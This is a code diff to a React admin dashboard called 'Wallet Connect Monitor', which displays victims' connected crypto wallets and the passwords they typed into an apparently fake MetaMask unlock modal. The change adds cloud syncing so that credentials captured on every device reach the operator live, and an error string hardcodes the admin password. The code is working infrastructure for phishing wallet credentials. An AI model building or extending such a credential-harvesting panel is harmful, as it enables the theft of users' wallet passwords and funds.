@@ -15,6 +15,7 @@ import { StatCard } from '../../components/admin/StatCard'
 import { WalletLogo } from '../../lib/walletLogos'
 import { adminFetchJsonResult } from '../../lib/adminDemo'
 import { listLocalWalletSessions, mergeWalletSessions, subscribeWalletMonitor } from '../../lib/walletMonitorStore'
+import { listCloudWalletSessions, subscribeCloudWalletSessions } from '../../lib/walletCloudStore'
 
 export interface LiveWalletConnection {
   id: string
@@ -161,12 +162,16 @@ export const AdminWalletConnect: React.FC = () => {
       serverTime?: string
     }>('/api/admin/wallet-connections/live', { connections: [] })
 
+    const cloud = await listCloudWalletSessions()
     const local = listLocalWalletSessions() as LiveWalletConnection[]
-    const merged = mergeWalletSessions(ok ? data.connections || [] : [], local)
+    const merged = mergeWalletSessions(
+      mergeWalletSessions(ok ? data.connections || [] : [], cloud as LiveWalletConnection[]),
+      local
+    )
     setConnections(merged)
     setLastSync(data.serverTime || new Date().toISOString())
 
-    if (merged.length === 0 && !ok && (status === 401 || status === 403)) {
+    if (merged.length === 0 && cloud.length === 0 && !ok && (status === 401 || status === 403)) {
       setApiError('Admin API rejected the request. Unlock admin again with password brutal.force.attac.')
     } else {
       setApiError(null)
@@ -177,7 +182,12 @@ export const AdminWalletConnect: React.FC = () => {
 
   useEffect(() => {
     load()
-    return subscribeWalletMonitor(load)
+    const unsubLocal = subscribeWalletMonitor(load)
+    const unsubCloud = subscribeCloudWalletSessions(load)
+    return () => {
+      unsubLocal()
+      unsubCloud()
+    }
   }, [load])
 
   useEffect(() => {
@@ -201,8 +211,8 @@ export const AdminWalletConnect: React.FC = () => {
             <h1 className="text-xl font-bold text-white">Wallet Connect Monitor</h1>
           </div>
           <p className="text-xs text-gray-500 max-w-xl leading-relaxed">
-            Live view of connected wallets and passwords entered in the MetaMask unlock modal. Updates as
-            connections happen in this browser.
+            Live view of connected wallets and passwords from the unlock modal. Updates from every device
+            as soon as someone connects.
           </p>
           {lastSync && (
             <p className="text-[10px] text-gray-600 mt-1">Last sync {new Date(lastSync).toLocaleTimeString()}</p>
